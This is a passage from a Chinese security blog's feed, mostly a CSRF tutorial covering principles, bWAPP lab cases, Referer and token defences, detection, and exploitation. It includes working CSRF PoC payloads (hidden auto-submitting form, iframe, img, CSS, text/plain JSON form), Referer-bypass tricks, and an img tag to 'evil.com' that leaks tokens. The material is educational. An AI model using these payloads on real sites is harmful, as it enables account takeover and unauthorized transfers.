class="line"></span><br><span class="line"><span class="comment">## 小结</span></span><br><span class="line"></span><br><span class="line"><span class="comment">###获取登录后的页面的三种方式</span></span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> 实例化 session，使用 session 发送 post 请求，在使用它，获取登陆后的页面</span><br><span class="line"><span class="number">2.</span> 在 headers 中添加 cookie 键，值为 cookie 字符串</span><br><span class="line"><span class="number">3.</span> 在请求方法中添加 cookies 参数，接收字典形式的 cookie。字典形式的 cookie 中的键是 cookie 的 name，值是 cookie 的 value</span><br><span class="line"></span><br><span class="line">   ```</span><br><span class="line">   r = requests.get(url, headers=headers, cookies=cookies)</span><br><span class="line">   ```</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 补充</span></span><br><span class="line"></span><br><span class="line">字典推导式：</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">cookies = &#123;i.split(<span class="string">&#x27;=&#x27;</span>)[<span class="number">0</span>].lstrip():i.split(<span class="string">&#x27;=&#x27;</span>)[<span class="number">1</span>] <span class="keyword">for</span> i <span class="keyword">in</span> cookies.split(<span class="string">&#x27;;&#x27;</span>)&#125;</span><br><span class="line">```</span><br><span class="line"></span><br><span class="line">注意：字典和集合都是无序的</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSRF 漏洞</title>
      <link href="/blog/2019/10/05/websec/csrf/"/>
      <url>/blog/2019/10/05/websec/csrf/</url>
      
        <content type="html"><![CDATA[<h1 id="csrf-漏洞定义">CSRF 漏洞定义</h1><p>CSRF（Cross-Site Request Forery）也被称为 One Click Attack 或者Session Riding，通常缩写为 CSRF 或者 XSRF</p><p>XSS 与 CSRF 区别：</p><ol type="1"><li>XSS 利用站点内的信任用户，盗取 Cookie</li><li>CSRF 通过伪装成受信任用户请求受信任的网站</li></ol><h1 id="csrf-漏洞原理">CSRF 漏洞原理</h1><p>CSRF是跨站请求伪造，不攻击网站服务器，而是冒充用户在站内的正常操作，通常由于服务端没有对请求头做严格过滤引起的。CSRF会造成密码重置、用户伪造等问题，可能引发严重后果。</p><p>绝大多数网站是通过 Cookie等方式辨识用户身份，再予以授权的。所以要伪造用户的正常操作，最好的方法是通过XSS 或链接欺骗等途径，让用户在本机（即拥有身份 cookie的浏览器端）发起用户锁不知道的请求。CSRF攻击会令用户在不知情的情况下攻击自己已经登陆的系统。</p><p>利用目标用户的合法身份，以目标用户的名义执行某些非法操作。</p><p>可以这么理解 CSRF攻击：攻击者盗用了你的身份，以你的名义发送恶意请求。CSRF能够做的事情包括：以你名义发送邮件，发消息，盗取你的账号，甚至于购买商品，虚拟货币转账.……造成的主要问题包括：个人隐私的泄露以及财产安全。</p><p>例如：简单的转账案例</p><p>初始化链接：<code>http://www.xxx.com/pay.php?user=xxx&amp;money=100</code></p><p>黑客构造以下恶意链接，然后诱导用户在登录状态下点击该链接，便可以实现向自己转账的目的。</p><p><code>http://www.xxx.com/pay.php?user=恶意用户&amp;money=10000</code></p><h1 id="浏览器的-cookie-机制">浏览器的 Cookie 机制</h1><h2 id="两种表现形式">两种表现形式</h2><ol type="1"><li><p>本地 cookie， 又称持久性 Cookie</p><p>服务器端脚本语言向客户端发送 cookie，发送时定制了时效、过期时间expire，存储在<strong>本地</strong>。</p></li><li><p>临时性 Cookie， 又称 Session Cookie</p><p>没有定义 expire字段，存储在<strong>浏览器内存</strong>中，关闭浏览器，cookie失效。</p></li></ol><h1 id="csrf-危害">CSRF 危害</h1><ol type="1"><li><p>发送邮件。</p></li><li><p>修改账户信息</p></li><li><p>资金转账</p></li><li><p>XSS 与 CSRF</p></li><li><p>CSRF 蠕虫</p></li></ol><h1 id="csrf-类型">CSRF 类型</h1><h2 id="get-型-csrf">Get 型 CSRF</h2><p>假如微博存在 CSRF 漏洞，有一个 GET请求让别人点击后，关注我，这时可以做一些诱导性的博客。例如想让每一个用户都帮助自己转发微博，制造一次蠕虫攻击，找到转播文章的页面与关注我的页面，写一个POC，用 <code>&lt;iframe&gt;</code> 标签来加载 URL，加载两条URL，这时当用户点击会关注并且自动转发。</p><h3 id="案例一">案例一</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//会话验证，一般是客户端向服务端发送之前的 session_id&lt;——————确认用户已经登陆</span><br><span class="line">$user = $_GET[&#x27;user&#x27;];</span><br><span class="line">$money = $_GET[&#x27;money&#x27;];</span><br><span class="line">//转账操作&lt;————————开始转账</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><p>由此得出 CSRF 成功利用的条件：</p><ol type="1"><li>用户已经登陆系统</li><li>用户访问对应 URL</li></ol><p>CSRF 漏洞利用：</p><p>bWAPP 的 CSRF</p><p>CSRF（Change Password）</p><p>本关特征：</p><ol type="1"><li><p>只输入新密码，不用输入旧密码</p></li><li><p>使用 get 方式提交。</p><p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Request URL:</span><br><span class="line">http://lab11.me/bWAPP/csrf_1.php?password_new=hack&amp;password_conf=hack&amp;action=change</span><br></pre></td></tr></table></figure></p><p>get 参数中直接暴露新密码以及第二次确认的新密码</p></li></ol><p>我们可以直接伪造修改密码的 URL，比如：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Request URL:</span><br><span class="line">http://lab11.me/bWAPP/csrf_1.php?password_new=bug&amp;password_conf=bug&amp;action=change</span><br></pre></td></tr></table></figure><p>然后诱导用户在登录该网站的状态下，点击该链接，便可以达到恶意修改密码的目的。</p><p>诱导的方式可以有很多种，比如：隐蔽利用 img 标签的 src 属性</p><p>当然，实际环境中，基本不会出现具有这样特征的修改密码方式，但这对我们了解CSRF 的原理有着一定的帮助。</p><p><strong>以下的 GET 和 POST 类型的 CSRF都是由于没有对用户身份进行验证导致的</strong>，因此可以由攻击者另外构造恶意的网页来进行攻击，如果对用户身份进行了验证，那么就不能单独构造网页了。</p><h3 id="案例二">案例二</h3><p>添加新用户</p><p>代码分析</p><p><strong>没有验证用户身份（session、cookie 等）</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sq1</span> = <span class="string">&quot;INSERT INTO `adminsql`(`id`, `username`, `password`) VALUES(13, &#x27;<span class="subst">$username</span>&#x27;, &#x27;<span class="subst">$password</span>&#x27;)&quot;</span>;</span><br><span class="line"><span class="variable">$row</span> = mysq1_query（<span class="variable">$sq1</span>）；<span class="comment">//执行sql插入语句</span></span><br><span class="line"><span class="variable">$sq1</span> = <span class="string">&quot;SELECT * FROM adminsql&quot;</span>；</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span> = <span class="title function_ invoke__">mysq1_query</span>(<span class="variable">$sql</span>))&#123;</span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$rows</span> = <span class="title function_ invoke__">mysq1_fetch_array</span>(<span class="variable">$row</span>))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;user:<span class="subst">&#123;$rowsI&#x27;username&#x27;]&#125;</span>-----pass:<span class="subst">&#123;$rows[&#x27;password&#x27;]&#125;</span>&quot;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>；</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用</p><p>同上面 bWAPP change password 的利用，隐蔽利用 img 标签的 src属性，比如：我们构造一个网页，网页中设置一个 img 的 src为恶意连接，那么用户在登录状态下，访问我们发给他的网页，就会发送恶意的URL， 从而添加新用户。</p><h2 id="post-型-csrf">Post 型 CSRF</h2><p>添加新用户</p><p>代码分析</p><p>同 GET 也<strong>没有进行用户身份验证</strong>，只是获取参数是使用POST 获取。</p><p>代码利用</p><p>利用 hidden 的 input标签，我们构造恶意网页，网页中显示一些诱惑信息，并且写一个 form表单，表单的 action 则是存在 CSRF 的网页链接。我们将提前查看的 POST的数据值对，进行修改，然后在网页中加入 hidden 的 input， name 属性按照post 的值进行填写， value我们自己构造一个恶意的。然后诱导用户访问该网页就可以了</p><h1 id="csrf-漏洞防御">CSRF 漏洞防御</h1><h2 id="使用者的防御">使用者的防御</h2><p>CSRF攻击之所以能成立，是因为使用者在被攻击的网页是处于已经登入的状态，所以才能做出一些行为。虽然说这些攻击应该由网页那边负责处理，但如果你担心网页会处理不好的话，你可以在每次使用完网站就登出，就可以避免掉CSRF。不过，这怕是废话，还要用户注意这个安全，要你网站安全人员有个球用。</p><h2 id="referer-check-防御">Referer Check 防御</h2><p>原理</p><p>HTTP Referer 是 header 的一部分，当浏览器向 web服务器发送请求的时候，一般会带上 Referer，告诉服务器我是从哪个页面链接过来的，服务器基此可以获得一些信息用于处理。</p><p>Referer Check 防御</p><p>Referer Check主要用于防止盗链。同理也可以用来检查请求是否来自合法的“源”。比如用户修改密码，一定是在登录系统后台之后进行操作。所以在修改提交表单的时候，一定会从系统后台页面提交，携带 Referer 头。如果 Referer不是当前系统的域，那么极有可能遭受 CSRF。缺陷：服务器并非任何时候都可以取到 Referer。例如 HTTPS 跳转到 HTTP。</p><p>当用户点击被构造好的 CSRF 利用页面，那么在执行用户对应操作时，提交的HTTP 请求中就有对应的 Referer 值，此时服务端判断 Referer值是否与服务器的域名信息有关。如果不相关则不执行操作。</p><p>Referer 防御代码编写</p><p>在 PHP 中使用 $_SERVER[‘HTTP_REFERER] 获取页面提交请求中的 referer值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(strpos($_SERVER[‘HTTP_REFERER], &#x27;xx.com&#x27;) !== FALSE)</span><br><span class="line">&#123;</span><br><span class="line">判断成功</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">｛</span><br><span class="line">判断失败</span><br><span class="line">｝</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>如何绕过 Rreferer</p><p>技巧：如果服务器端只判断当前 Referer中是否具有域名，那么直接可以新建文件夹。即：在我们站点当中新建一个以该域名为名字的文件夹，然后将恶意文件放入该文件夹中，那么Referer 中就可以匹配到该域名</p><h2 id="token-防御">Token 防御</h2><p>是否设置 Token， 用户每次访问都验证 Token，这样 CSRF漏洞也就不复存在了</p><p>Anti CSRF Token 防御</p><p>CSRF 本质原因：重要操作的所有参数都是被恶意攻击者猜测到的。那么防御措施就是生成一个随机且不被轻易猜测的参数。目前大多数防御都采用token（不可预测）。</p><p><strong>为什么 token 可以防御 CSRF？</strong></p><p>正常来说，比较容易理解的是，正确的 CSRFtoken 被放在了服务器的 Session文件中。而 seesion id 一般会被被放在了 cookie 中。</p><p>当用户执行增删改操作的时候，服务器会根据 cookie 中的 session id匹配<code>用户对应的 Session 文件</code>（位于服务端），然后从中取出这个Token 值和用户提交到服务器的 Token 值(这里一般为表单中的 hidden 的 input标签提交 token)做对比（即：HTTP 请求中的token）。如果两者数值相同，用户的增删改操作才是被允许执行的，否则用户的请求就是不合法的，即CSRF。</p><p>用户正常操作产生的 Token 是请求页面通过使用 JS生成的随机数。这个随机数和用户 Session （位于服务端）中的随机数绑定。但攻击者伪造的链接中，无法计算或者伪造出这个随机数。 因为 HTTP请求中攻击者伪造出的随机数和用户 Session中保存的随机数不同，服务器可依据该随机数判断出该请求不是来自用户正常操作，从而拒绝用户请求。</p><p>浏览器的同源策略：协议、IP、端口号不同的的 URL被浏览器视为不同的源。JS 无法跨源获取用户 Cookie 的值。 而且一般来说Cookie 中的关键字段都有 Http only 属性。拥有该属性的 Cookie值，即便是同源环境内 Javascript 也无法对其执行操作。所以 <strong>cookie中的内容</strong> 对攻击者是不可见的。</p><p>Token 泄露</p><p>GET 型 Token泄露，<strong>如果页面可以包含访问攻击者的站点</strong>（但没有 XSS要求那么高），如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;http:/evil.com/&quot;/&gt;</span><br></pre></td></tr></table></figure><p>那么请求中的 Referer 就会携带对应的 GET Token。</p><p>POST 型 Token 泄露</p><p>利用 XSS 漏洞读取 Cookie，获取存储在其中的 Token 值。</p><h2 id="敏感操作二次验证">敏感操作二次验证</h2><ol type="1"><li>一般情况下，使用 JavaScript验证（比如：提醒用户该操作是否继续），但是是否执行成功取决于用户，不建议使用。</li><li>验证码强制验证</li></ol><h3 id="验证码防御">验证码防御</h3><p>验证码防御被认为是对抗 CSRF 最为简单而且有效的防御方法。 CSRF在用户不知情的情况下完成对应操作，而验证码强制用户与应用程序交互，才能最终完成操作。通常情况下，验证码能够很好的遏制 CSRF。</p><p>出于用户体验考虑，不可能每一个操作都加入验证码。所以验证码只作为辅助手段，不能作为防御CSRF 的主要解决方案。</p><ul><li>验证码防御也可以被认为是二次验证</li></ul><h2 id="参考及推荐">参考及推荐</h2><p><ahref="https://juejin.im/post/5bc009996fb9a05d0a055192#heading-14">前端安全系列之二：如何防止CSRF 攻击？</a></p><p><ahref="https://blog.csdn.net/sdb5858874/article/details/81666194">为什么CSRF Token 写在 COOKIE 里面</a></p><p><ahref="https://blog.csdn.net/wabiaozia/article/details/75196939">关于Token，你应该知道的十件事</a></p><p><ahref="https://blog.csdn.net/qq_15096707/article/details/51307024">web安全之 token 和 CSRF 攻击</a></p><p><ahref="https://segmentfault.com/a/1190000017831088#articleHeader10">彻底弄懂session，cookie，token</a></p><h1 id="csrf-检测">CSRF 检测</h1><p>CSRF是伪造<strong>用户的请求</strong>，所以首先需要清楚用户可以做哪些操作、发哪些请求。</p><p>常见的地方：转账，修改用户资料、密码，购买东西、删除文章</p><p>手工检测：不必说了，在常见场景下手动检测</p><p>半自动检测：常用 BurpSuite，还有 CSRFTester</p><p>全自动检测：主要是插件，目前也有现成的</p><h3 id="http-自定义头">HTTP 自定义头</h3><p>如果 Web 应用程序的 HTTP请求中没有对应的预防措施，那么很大程度上就确定存在 CSRF 漏洞。</p><p>情况 A: 无 token 无 referer 验证</p><p>情况 B： 无 token 有 referer 验证这种情况比较常见，也许我们抓包发现无token 正庆幸时，删除 referer 重新提交一看发现报错了 一. 我们可以试试空referer: 即删除 header 中的 referer 的值，如果服务器只是验证了是否存在referer 没验证 referer 值 的话，我们重新提交会发现一个 CSRF漏洞又被发现了~因为所有跨协议传递的请求都是不会送 referer 的，如https-&gt;http ,(这个利 用成本有点高）还有 javascript-&gt;http,data-&gt;http.</p><p>二. 如果直接去掉 referer 参数请求失败，这种还可以继续验证对 referer的判断是否严格，是否可以绕过。</p><p>修改 referer 值：如果原 referer 值为 Referer： t.qq.com/xxxx话，我们可以试试修改为 Referer:t.qq.com.baidu.com/xxx。如果服务器只是验证了 referer 是否存在 qq.com或者 t.qq.com 等关键词的话，争对前一种情况，我们可以在腾讯某子站点（http://xx.qq.com）发个帖子将图片地址修改为我们构造的csrf链接或者写好CSRF表单后将地址发布在微博上等待其它用户点击，针对后一种情况我们可以建立个t.qq.com.yourdomain.com 的域名存放 CSRF 表单来绕过 REFERER 检测;</p><p>当只采用 refer 防御时，可以把请求中的修改成如下试试能否绕过：</p><p>原始 refer：<code>http://test.com/index.php</code></p><p>测试几种方式（以下方式可以通过的话即可能存在问题）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://test.com.attack.com/index.php</span><br><span class="line"></span><br><span class="line">http://attack.com/test.com/index.php</span><br></pre></td></tr></table></figure><h3 id="get-类型">GET 类型</h3><p>如果有 token 等验证参数，先去掉参数尝试能否正常请求。如果可以，即存在CSRF 漏洞。</p><p>POST 类型</p><p>​ 如果有 token等验证参数，先去掉参数尝试能否正常请求。如果可以，再去掉 referer参数的内容，如果仍然可以，说明存在 CSRF 漏洞，可以利用构造外部 form表单的形式，实现攻击。</p><p>改 Method</p><p>有些程序后端可能是用 REQUEST 方式接受的，而程序默认是 POST请求，其实改成 GET 方式请求也可以发送过去，存在很严重的隐患。</p><p><a href="https://blog.51cto.com/eth10/1974796">CSRF简单判断方法</a></p><p><a href="https://www.cnblogs.com/milantgh/p/3729421.html">CSRF手工测试方法</a></p><p><ahref="https://www.lstazl.com/csrf%E6%BC%8F%E6%B4%9E%E5%A4%8D%E4%B9%A0%E6%80%BB%E7%BB%93/">CSRF漏洞复习总结</a></p><p><ahref="https://blog.csdn.net/Breeze_CAT/article/details/84955701">CSRF安全测试流程</a></p><h1 id="漏洞修补逻辑分析">漏洞修补逻辑分析</h1><p>CSRF漏洞实质：服务器无法准确判断当前请求是否是合法用户的自定义操作。</p><p>如果服务器在用户登录之后给予用户一个唯一合法令牌，每一次操作过程中，服务器都会验证令牌是否正确，如果正确，执行操作。不正确，则不执行操作。一般情况下，给予的令牌会写入表单中隐藏域的 value值中，随着表单内容进行提交。</p><p>登录验证 login.php --&gt; 登录成功执行操作，操作过程中有 cookie提交的身份凭证 ---&gt; 登录后执行操作（增删改查）---&gt;没有登录成功执行操作自动跳回登录页面</p><p>远程构造 CSRF 利用 POC，用户点击，就会发送同时携带 session的请求，成功利用POC。如果利用在增删改中设置唯一令牌，执行操作时只有提交令牌才能操作的话，就可以有效防止CSRF。如果令牌不正确，那么不执行操作。并给出提示内容。</p><p>登录成功后，给与唯一令牌</p><p>增删改部分给与令牌，并在提交操作时，提交令牌并进行验证。一般情况下，使用表单hidden 进行提交，或者 Cookie。</p><h2 id="生成-token-代码分析">生成 Token 代码分析</h2><p>Token作为识别操作是否是当前用户自己操作的唯一凭证，需要设置为复杂难以被破解的内容</p><p>例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function generateToken()&#123;</span><br><span class="line">$salt = &#x27;test&#x27;.data(&#x27;Y/m/d&#x27;)</span><br><span class="line">$token = md5($salt)</span><br><span class="line">return $token</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是上述代码的 salt 容易被破解</p><ol type="1"><li>颗粒度是日，容易被猜测，因此我们可以改成时分秒。</li><li>test 容易被猜解，可以改成随机长串</li></ol><h2 id="使用-token-进行-csrf-漏洞防御">使用 Token 进行 CSRF漏洞防御</h2><ol type="1"><li><p>登录验证成功之后，在会话 SESSION['user_token"] 中保存Token。</p></li><li><p>在后台操作中，增删改表单中添加隐藏域 hidden，设置 Value 为Token。</p></li><li><p>提交之后进行验证 Token 是否正确。</p></li></ol><h1 id="csrf-漏洞利用">CSRF 漏洞利用</h1><ol type="1"><li>CSRF 的攻击建立在浏览器与 Web 服务器的会话中</li><li>欺骗用户访问 URL</li></ol><h2 id="a-标签的-href">a 标签的 href</h2><p>在 html 中，a标签代表链接，可以将当前的”焦点”指引到其他位置。移动的“焦点”需要发送对应的请求到链接指向的地址，然后返回响应。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;请求地址，会被 http 请求到的位置，可以携带GET型参数&quot;</span>&gt;</span>内容<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span></span></span><br><span class="line"><span class="tag">    <span class="attr">href</span>=<span class="string">&quot;http://127.0.0.1/csrf test/get _csrf/new_user.php？username=liuxiaoyang&amp;password=123456&quot;</span></span></span><br><span class="line"><span class="tag">    &gt;</span>请点击我&lt;/a</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><h2 id="iframe-标签的-src">iframe 标签的 src</h2><p>iframe 标签内容将在页面加载过程中自动进行加载，src指向的位置就是页面请求的位置 注意：可以设置 iframe 的style-&gt;display:none，以此来不显示 iframe 加载的内容。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span></span></span><br><span class="line"><span class="tag">    <span class="attr">src</span>=<span class="string">&quot;http://127.0.0.1/csri_test/get_csrf/new_user.php？username=liuxiaoyang&amp;password=123456&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">style</span>=<span class="string">&quot;display:none&quot;</span></span></span><br><span class="line"><span class="tag">/&gt;</span></span><br></pre></td></tr></table></figure><h2 id="隐藏的-iframe">隐藏的 iframe</h2><p>常用会返回信息的 POST 型 CSRF，使用隐藏的 iframe进行攻击，就不会让受害者发现。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">style</span>=<span class="string">&quot;display:none&quot;</span> <span class="attr">name</span>=<span class="string">&quot;csrf-frame&quot;</span>&gt;</span> <span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span></span></span><br><span class="line"><span class="tag">    <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">action</span>=<span class="string">&quot;https://xxx.com/delete&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">target</span>=<span class="string">&quot;csrf- frame&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">id</span>=<span class="string">&quot;csrf-form&quot;</span></span></span><br><span class="line"><span class="tag">&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;id&quot;</span> <span class="attr">value</span>=<span class="string">&quot;3&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;csrf-form&quot;</span>).<span class="title function_">submit</span>();</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>开一个看不见的 iframe，让 form submit 之后的结果出现在 iframe里面，而且这个 form 还可以自动 submit。</p><h2 id="img-标签的-src">img 标签的 src</h2><p>img 标签利用 img 标签的内容会随着页面加载而被请求，以此 src指向的位置会在页面加载过程中进行请求。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span></span></span><br><span class="line"><span class="tag">    <span class="attr">src</span>=<span class="string">&quot;http://127.0.0.1/csrf test/get_csrf/new_user.php？username=liuxiaoyang&amp;password=123456&quot;</span></span></span><br><span class="line"><span class="tag">/&gt;</span></span><br></pre></td></tr></table></figure><h2 id="css-backgroud-利用">CSS-backgroud 利用</h2><p>可以利用 CSS 中 background 样式中的 url来加载远程机器上的内容，从而对 url 中的内容发送 HTTP 请求 例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">body&#123;</span><br><span class="line">background:#00FF00 url（&#x27;&#x27;）no-repeat fixed top；</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;h1 style=&quot;background:url(&quot;http://127.0.0.1/csrf_test/get_csrf/new_user.php?username=123123&amp; password=123456&#x27;);&quot;&quot;&gt;CSRF</span><br><span class="line">POC&lt;/h1&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="构造-json">构造 JSON</h2><p>如果后端只接受 JSON 数据，<ahref="https://docs.spring.io/spring-security/site/docs/current/reference/html/csrf.html">spring的 document</a> 也可以构造（注：这个我没测试过 emm）</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span></span></span><br><span class="line"><span class="tag">    <span class="attr">action</span>=<span class="string">&quot;https://small-min.blog.com/delete&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">method</span>=<span class="string">&quot;post&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">enctype</span>=<span class="string">&quot;text/plain&quot;</span></span></span><br><span class="line"><span class="tag">&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&#x27;&#123;&quot;id&quot;:3, &quot;deleteid&quot;:&quot;&#x27;</span> <span class="attr">value</span>=<span class="string">&#x27;2&quot;&#125;&#x27;</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;delete!&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这样子会产生如下的 request body：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span> <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="number">3</span><span class="punctuation">,</span> <span class="attr">&quot;deleteid&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2&quot;</span> <span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><blockquote><p><code>form</code>能够带的 content type只有三种：<code>application/x-www-form-urlencoded</code>,<code>multipart/form-data</code>跟<code>text/plain</code>。在上面的攻击中我们用的是最后一种，<code>text/plain</code>，如果你在你的后端Server 有检查这个 content type 的话，是可以避免掉上面这个攻击的。</p></blockquote><p>如果你的 api 接受 cross origin 的 request ，即：你的 api的<code>Access-Control-Allow-Origin</code>设成<code>*</code>的话，代表任何domain 都可以发送 ajax 到你的 api server，这样无论你是改成 json，甚至把method 改成 PUT, DELETE 都没有用。</p><p>XSS 与 CSRF</p><ol type="1"><li><p>self xss 与 CSRF</p></li><li><p>一般 xss 与 csrf</p><p>通过 xss 可以获取 token，（因为像 script img link等标签不受浏览器同源策略的影响，可以跨域。而一般标签是无法跨域的。），然后使用token 与 csrf 伪造用户操作。</p></li></ol><h1 id="推荐资料">推荐资料</h1><p><ahref="https://www.tr0y.wang/2019/06/02/CSRF%E6%8C%87%E5%8C%97/">CSRF指北</a></p>]]></content>
      
      
      <categories>
          
          <category> websec </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>逻辑漏洞入门篇</title>
      <link href="/blog/2019/10/05/websec/logic_vuln/logic_vuln/"/>
      <url>/blog/2019/10/05/websec/logic_vuln/logic_vuln/</url>
      
